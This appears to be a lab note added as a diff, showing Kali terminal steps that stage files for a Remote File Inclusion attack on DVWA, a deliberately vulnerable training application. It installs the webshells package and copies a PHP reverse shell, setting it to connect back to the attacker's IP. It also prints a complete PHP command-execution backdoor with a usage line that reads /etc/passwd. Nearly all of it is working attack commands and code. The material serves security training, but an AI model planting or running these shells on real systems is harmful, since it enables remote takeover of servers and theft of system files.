@@ -1,0 +1,91 @@
+------------------------------------------------------------------------------------------------------------------------------------
+Staging files for Remote File Inclusion (RFI):
+
+┌──(kali㉿host)-[/var/www/html/DVWA/config]
+└─$ sudo apt update && sudo apt install webshells -y
+[sudo] password for kali:
+Sorry, try again.
+[sudo] password for kali:
+Hit:1 http://http.kali.org/kali kali-last-snapshot InRelease
+All packages are up to date.
+Installing:
+  webshells
+Summary:
+  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 0
+  Download size: 15.2 kB
+  Space needed: 72.7 kB / 1,024 GB available
+Get:1 http://http.kali.org/kali kali-last-snapshot/main amd64 webshells all 1.1+kali8 [15.2 kB]
+Fetched 15.2 kB in 10s (1,481 B/s)
+Selecting previously unselected package webshells.
+(Reading database ... 33704 files and directories currently installed.)
+Preparing to unpack .../webshells_1.1+kali8_all.deb ...
+Unpacking webshells (1.1+kali8) ...
+Setting up webshells (1.1+kali8) ...
+
+┌──(kali㉿kali)-[~]
+└─$ locate php-reverse-shell.php
+/home/kali/php-reverse-shell.php
+/usr/share/laudanum/php/php-reverse-shell.php
+/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+/usr/share/webshells/php/php-reverse-shell.php
+
+┌──(kali㉿host)-[/var/www/html/DVWA/config]
+└─$ sudo cp /usr/share/webshells/php/php-reverse-shell.php .
+
+┌──(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.48.128  netmask 255.255.255.0  broadcast 192.168.48.255
+        inet6 fe80::fd1f:e6cd:8034:84fe  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:82:43:8a  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+Update php-reverse-shell.php with your KALI IP:
+
+┌──(kali㉿kali)-[~]
+└─$ sudo vim php-reverse-shell.php 
+
+┌──(kali㉿kali)-[~]
+└─$ cat php-reverse-shell.php | grep '$ip'
+$ip = '192.168.48.128';  // CHANGE THIS TO YOUR KALI IP
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+printit("Successfully opened reverse shell to $ip:$port");
+
+┌──(kali㉿kali)-[~]
+└─$ locate simple-backdoor.php
+/usr/share/webshells/php/simple-backdoor.php
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cp /usr/share/webshells/php/simple-backdoor.php .
+
+simple-backdoor.php does not need to be updated:
+┌──(kali㉿kali)-[~]
+└─$ cat simple-backdoor.php
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+<!--    http://michaeldaw.org   2006    -->
